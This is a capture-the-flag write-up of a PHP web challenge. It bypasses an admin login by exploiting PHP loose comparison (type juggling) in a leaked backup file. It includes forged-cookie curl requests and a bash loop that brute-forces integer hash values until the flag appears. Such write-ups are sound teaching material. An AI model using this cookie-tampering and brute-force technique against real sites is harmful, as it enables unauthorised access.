# My admin panel
Web/Warmup

## Challenge 

I think I've found something interesting, but I'm not really a PHP expert. Do you think it's exploitable?

https://gameserver.zajebistyc.tf/admin/


## Solution

We see a file directory

	Index of /admin
	[ICO]	Name	Last modified	Size	Description
	[PARENTDIR]	Parent Directory	 	-	 
	[   ]	login.php	2019-03-16 00:17	660	 
	[   ]	login.php.bak	2019-03-15 19:04	658	 
	Apache/2.4.25 (Debian) Server at gameserver.zajebistyc.tf Port 80

We can download the source code of [login.php.bak](login.php.bak)

It enforced regex, uppercase JSON as the cookie value

	{"hash": [0-9A-Z\"]+}


Try out. Digits and Uppercase letters only

	$ curl https://gameserver.zajebistyc.tf/admin/login.php
	Not authenticated.

	$ curl --cookie 'otadmin={"hash": "test"}' https://gameserver.zajebistyc.tf/admin/login.php
	COOKIE TAMPERING xD IM A SECURITY EXPERT

	$ curl --cookie 'otadmin={"hash": "TEST"}' https://gameserver.zajebistyc.tf/admin/login.php
	I CAN EVEN GIVE YOU A HINT XD 
	0006464640640064000646464640006400640640646400

Hint is the MD5 string ANDed together with 0xC0 or 0b1100_0000

    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

From the hint, we can see 2 numbers: 0 and 64

	array = [0,0,0,64,64,64,0,64,0,0,64,0,0,0,64,64,64,64,0,0,0,64,0,0,64,0,64,0,64,64,0,0]

Since this is MD5 hexdigest ranges from `0-9 A-F`,we can assume that after & 0xC0,  0 represents digits and 64 represents letters

	Convert to represetation
	000AAA0A00A000AAAA000A00A0A0AA00

We notice that the source code uses PHP double equal operator instead of triple equal.

	if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {

PHP tricks/exploits for conversion of string to integer

- https://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo
- https://stackoverflow.com/questions/6843030/why-does-php-consider-0-to-be-equal-to-a-string

Do some PHP tests

	$ echo "<?php echo (int) strtoupper(MD5('xDdddddd')).PHP_EOL; ?>" | php
	6764
	$ echo "<?php echo strtoupper(MD5('xDdddddd')).PHP_EOL; ?>" | php
	6764CDF9F2732F2F23B752BFF76C9017

	$ echo "<?php echo (int) strtoupper(MD5('hello')).PHP_EOL; ?>" | php
	5
	$ echo "<?php echo strtoupper(MD5('hello')).PHP_EOL; ?>" | php
	5D41402ABC4B2A76B9719D911017C592


We see that the leading digits are converted into the integer and it stops at the alphabet

Since our hinted array has 3 digits before an alphabet, thus bruteforce 000 to 999

	In the md5 representation, note the leading 3 digits
	000AAA0A00A000AAAA000A00A0A0AA00

Simple script

	for digit in {0..999}; do
		echo "Doing $digit";
		curl --cookie "otadmin={\"hash\": $digit}" https://gameserver.zajebistyc.tf/admin/login.php;
	done

And running for a while, we see the flag at 389.

	$ for digit in {0..999}; do
	> echo "Doing $digit";
	> curl --cookie "otadmin={\"hash\": $digit}" https://gameserver.zajebistyc.tf/admin/login.php;
	> done
	Doing 0
	I CAN EVEN GIVE YOU A HINT XD 
	0006464640640064000646464640006400640640646400
	Doing 1
	I CAN EVEN GIVE YOU A HINT XD 
	0006464640640064000646464640006400640640646400
	Doing 2
	I CAN EVEN GIVE YOU A HINT XD 
	0006464640640064000646464640006400640640646400
	...

	Doing 388
	I CAN EVEN GIVE YOU A HINT XD 
	0006464640640064000646464640006400640640646400
	Doing 389
	Congratulations! p4{wtf_php_comparisons_how_do_they_work}
	Doing 390
	I CAN EVEN GIVE YOU A HINT XD 
	0006464640640064000646464640006400640640646400

## Flag

	p4{wtf_php_comparisons_how_do_they_work}
